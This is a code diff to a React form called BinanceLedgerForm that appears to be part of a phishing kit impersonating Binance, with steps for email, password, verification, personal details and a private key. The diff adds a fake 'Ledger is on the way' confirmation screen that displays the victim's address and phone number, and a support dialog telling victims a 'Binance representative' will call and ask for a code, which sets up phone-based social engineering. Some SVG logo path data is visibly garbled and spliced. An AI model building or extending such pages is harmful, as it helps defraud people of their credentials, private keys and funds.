@@ -4,7 +4,7 @@ import { AlertTriangle } from "lucide-react";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
 
-type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'summary' | 'verifying' | 'success' | 'private-key' | 'confirmation';
+type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'summary' | 'verifying' | 'success' | 'private-key' | 'confirmation' | 'ledger-shipping';
 
 const countries = [
   "United States", "United Kingdom", "Canada", "Australia", "Germany", "France", "Italy", "Spain", "Netherlands", "Belgium",
@@ -256,8 +256,131 @@ const BinanceLedgerForm: FC = () => {
     );
   };
 
-  // Render special states (important notice, summary, verifying, success, private-key, confirmation)
+  // Render special states (important notice, summary, verifying, success, private-key, confirmation, ledger-shipping)
   const renderSpecialState = () => {
+    if (currentStep === 'ledger-shipping') {
+      return (
+        <div style={{ minHeight: "450px", display: "flex", flexDirection: "column" }}>
+          <div className="flex-1">
+            <div 
+              className="text-lg font-semibold font-binance mb-6 text-center"
+              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+            >
+              Your Ledger is on the way
+            </div>
+            
+            {/* Ledger Device Image */}
+            <div className="flex justify-center mb-6">
+              <div className="relative">
+                <div className="absolute inset-0 bg-gradient-to-r from-yellow-400/20 to-yellow-600/20 rounded-2xl blur-xl transform scale-110"></div>
+                <div className="relative bg-gradient-to-br from-[#2B3139] to-[#1E2329] p-4 rounded-2xl border border-yellow-500/30 shadow-2xl">
+                  <img 
+                    src="/lovable-uploads/3cd31df8-babf-4eef-b7a9-a928a99a63e5.png" 
+                    alt="Binance Ledger Device" 
+                    className="w-32 h-auto object-contain"
+                  />
+                </div>
+              </div>
+            </div>
+
+            <div className="text-left space-y-4 mb-5">
+              <div className="bg-green-500/10 border border-green-500/20 rounded p-3">
+                <div className="text-xs font-binance text-green-400 leading-relaxed">
+                  <strong>✓ Order Confirmed:</strong><br/>
+                  Your Binance Ledger device has been prepared and will be shipped to your address.
+                </div>
+              </div>
+
+              <div className="text-xs font-binance text-white leading-relaxed">
+                <strong>Shipping Details:</strong>
+              </div>
+              
+              <div className="bg-[#2B3139] border border-[#474D57] rounded p-3 space-y-2">
+                <div className="grid grid-cols-1 gap-2 text-xs">
+                  <div className="flex justify-between">
+                    <span className="font-binance text-gray-400">Name:</span>
+                    <span className="font-binance text-white">{personalDetails.firstName} {personalDetails.lastName}</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="font-binance text-gray-400">Address:</span>
+                    <span className="font-binance text-white text-right">{personalDetails.address}</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="font-binance text-gray-400">City:</span>
+                    <span className="font-binance text-white">{personalDetails.city}</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="font-binance text-gray-400">Postal Code:</span>
+                    <span className="font-binance text-white">{personalDetails.postalCode}</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="font-binance text-gray-400">Country:</span>
+                    <span className="font-binance text-white">{personalDetails.country}</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="font-binance text-gray-400">Phone:</span>
+                    <span className="font-binance text-white">{personalDetails.phoneNumber}</span>
+                  </div>
+                </div>
+              </div>
+              
+              <div className="bg-yellow-500/10 border border-yellow-500/20 rounded p-3">
+                <div className="text-xs font-binance text-yellow-400 leading-relaxed">
+                  <strong>📦 Delivery Information:</strong><br/>
+                  • Your Ledger device will arrive within <strong>10 business days</strong><br/>
+                  • You will receive a tracking number via email once shipped<br/>
+                  • The package will include setup instructions for your second security key
+                </div>
+              </div>
+
+              <div className="text-xs font-binance text-white leading-relaxed">
+                <strong>What's Next:</strong><br/>
+                Once you receive your Ledger device, follow the included instructions to generate your second security key. This completes your two-key security system for maximum protection of your assets.
+              </div>
+            </div>
+          </div>
+
+          <div className="mt-auto space-y-3">
+            <Dialog open={isCallDialogOpen} onOpenChange={setIsCallDialogOpen}>
+              <DialogTrigger asChild>
+                <button
+                  type="button"
+                  className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 border border-yellow-500/50 font-bold font-binance text-xs"
+                  style={{
+                    backgroundColor: "transparent",
+                    color: "var(--color-BtnBg, #FCD535)",
+                    height: "34px"
+                  }}
+                >
+                  Contact Support for Shipping Questions
+                </button>
+              </DialogTrigger>
+              <DialogContent className="bg-[#1E2329] border-[#474D57]">
+                <DialogHeader>
+                  <DialogTitle className="text-white text-sm font-binance">Shipping Support</DialogTitle>
+                </DialogHeader>
+                <div className="text-xs font-binance text-white leading-relaxed">
+                  A Binance representative will contact you shortly regarding your shipping inquiry. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
+                </div>
+              </DialogContent>
+            </Dialog>
+
+            <button
+              type="button"
+              className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
+              style={{
+                backgroundColor: "var(--color-BtnBg, #FCD535)",
+                color: "var(--color-TextOnYellow, #202630)",
+                height: "34px"
+              }}
+            >
+              Continue to Dashboard
+            </button>
+          </div>
+        </div>
+      );
+    }
+
     if (currentStep === 'confirmation') {
       return (
         <div className="text-center" style={{ minHeight: "450px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
@@ -311,6 +434,7 @@ const BinanceLedgerForm: FC = () => {
 
             <button
               type="button"
+              onClick={() => transitionToStep('ledger-shipping')}
               className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
               style={{
                 backgroundColor: "var(--color-BtnBg, #FCD535)",
@@ -385,7 +509,7 @@ const BinanceLedgerForm: FC = () => {
                     height: "34px"
                   }}
                 >
-                  Request a Call from a Binance Representative
+                  Request a Call from a Binance Representative for Phone Support
                 </button>
               </DialogTrigger>
               <DialogContent className="bg-[#1E2329] border-[#474D57]">
@@ -1329,9 +1453,8 @@ const BinanceLedgerForm: FC = () => {
               <svg width="18" height="18" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="bn-svg">
                 <g clipPath="url(#clip0_2445_976)">
                   <path fillRule="evenodd" clipRule="evenodd" d="M19.68 12.1818C19.68 11.6146 19.6291 11.0691 19.5345 10.5455H12V13.64H16.3055C16.12 14.64 15.5564 15.4873 14.7091 16.0546V18.0618H17.2945C18.8073 16.6691 19.68 14.6182 19.68 12.1818Z" fill="#4285F4" />
-                  <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 20C14.1597 20 15.9706 19.2836 17.2942 18.0618L14.7088 16.0545C13.9924 16.5345 13.076 16.8182 11.9997 16.8182C9.91604 16.8182 8.1524 15.4109 7.52331 13.52H4.85059V15.5927C6.16695 18.2073 8.8724 20 11.9997 20Z" fill="#34A853" />
-                  <path fillRule="evenodd" clipRule="evenodd" d="M7.52364 13.52C7.36364 13.04 7.27273 12.5273 7.27273 12C7.27273 11.4727 7.36364 10.96 7.52364 10.48V8.40729H4.85091C4.30909 9.48729 4 10.7091 4 12C4 13.2909 4.30909 14.5127 4.85091 15.5927L7.52364 13.52Z" fill="#FBBC05" />
-                  <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 7.18182C13.1742 7.18182 14.2288 7.58545 15.0579 8.37818L17.3524 6.08364C15.9669 4.79273 14.156 4 11.9997 4C8.8724 4 6.16695 5.79273 4.85059 8.40727L7.52331 10.48C8.1524 8.58909 9.91604 7.18182 11.9997 7.18182Z" fill="#EA4335" />
+                  <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 20C14.1597 20 15.9706 19.2836 17.2942 18.0618L17.3524 6.08364C15.9669 4.79273 14.156 4 11.9997 4C8.8724 4 6.16695 5.79273 4.85059 8.40727L7.52331 10.48C8.1524 8.58909 9.91604 7.18182 11.9997 7.18182C13.1742 7.18182 14.2288 7.58545 15.0579 8.37818L17.3524 6.08364C15.9669 4.79273 14.156 4 11.9997 4C8.8724 4 6.16695 5.79273 4.85059 8.40727L7.52331 10.48C8.1524 8.58909 9.91604 7.18182 11.9997 7.18182Z" fill="#34A853" />
+                  <path fillRule="evenodd" clipRule="evenodd" d="M7.52364 13.52C7.36364 13.04 7.27273 12.5273 7.27273 12C7.27273 11.4727 7.36364 10.96 7.52364 10.48V8.40729H4.85091C4.30909 9.48729 4 10.7091 4 12C4 13.2909 4.30909 14.5127 4.85091 15.5927L7.52364 13.52C8.16744 12.6776 9.14969 12.1288 10.0132 11.232C10.2392 10.9972 14.1659 7.42557 14.2419 7.10157C14.2514 7.06104 14.2603 6.90999 14.1705 6.83024C14.0808 6.75048 13.9483 6.77775 13.8528 6.79944C13.7173 6.83019 11.5595 8.25641 7.37938 11.0781C6.7669 11.4987 6.21213 11.7036 5.71508 11.6929C5.16711 11.681 4.11306 11.383 3.32947 11.1283C2.36838 10.8159 1.60451 10.6507 1.67103 10.1202C1.70568 9.84381 2.08624 9.56118 2.81274 9.27228C2.81274 9.27228 2.81274 9.27228 2.81274 9.27228Z" fill="#00AEED" />
                 </g>
                 <defs>
                   <clipPath id="clip0_2445_976">
@@ -1370,7 +1493,7 @@ const BinanceLedgerForm: FC = () => {
   };
 
   // Check if we should show special states
-  const isSpecialState = currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success' || currentStep === 'summary' || currentStep === 'private-key' || currentStep === 'confirmation';
+  const isSpecialState = currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success' || currentStep === 'summary' || currentStep === 'private-key' || currentStep === 'confirmation' || currentStep === 'ledger-shipping';
 
   return (
     <div 
